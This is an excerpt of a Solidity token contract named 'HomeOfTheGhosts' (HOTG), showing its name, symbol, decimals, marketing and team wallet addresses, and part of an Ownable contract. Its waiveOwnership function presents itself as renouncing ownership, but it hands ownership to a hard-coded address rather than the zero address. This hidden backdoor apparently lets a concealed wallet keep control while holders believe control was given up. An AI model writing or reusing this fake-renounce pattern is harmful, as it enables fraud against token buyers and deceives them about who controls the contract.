...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x7AF14aBe1560C48a8B259ad8a4E26083e87963b0));
        _owner = address(0x7AF14aBe1560C48a8B259ad8a4E26083e87963b0);
    }
...
contract HomeOfTheGhosts is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "HomeOfTheGhosts";
    string private _symbol = "HOTG";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3f8747EF8B25B9Bbd09202cC9e83B2268fda0e30);
    address payable public teamWalletAddress = payable(0x608EF623E515A2f4c51342854592a749439E8750);
